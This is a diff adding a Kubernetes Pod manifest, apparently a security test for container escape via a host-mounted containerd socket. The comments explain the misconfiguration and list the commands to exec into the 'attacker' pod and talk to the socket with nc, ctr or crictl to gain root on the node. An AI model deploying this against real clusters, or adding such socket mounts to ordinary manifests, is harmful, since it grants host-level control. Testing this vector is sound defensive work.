@@ -1,0 +1,29 @@
+# Test for the "container runtime socket" vector.
+#
+# IMPORTANT: there is NO privileged and NO hostPID here. That is the
+# whole point of this vector — a mounted socket is enough for full root
+# on the node, and in a manifest it looks harmless (a typical mistake:
+# someone mounts the socket for image builds or a scanner and creates a
+# hole).
+#
+#   kubectl apply -f attacker-socket.yaml
+#   kubectl exec -it attacker-socket -- bash
+#   nc -U /run/containerd/containerd.sock     # or ctr/crictl
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attacker-socket
+spec:
+  nodeName: worker1
+  containers:
+    - name: attacker
+      image: nicolaka/netshoot
+      command: ["sleep", "3600"]
+      volumeMounts:
+        - name: containerd-sock
+          mountPath: /run/containerd/containerd.sock
+  volumes:
+    - name: containerd-sock
+      hostPath:
+        path: /run/containerd/containerd.sock
+        type: Socket
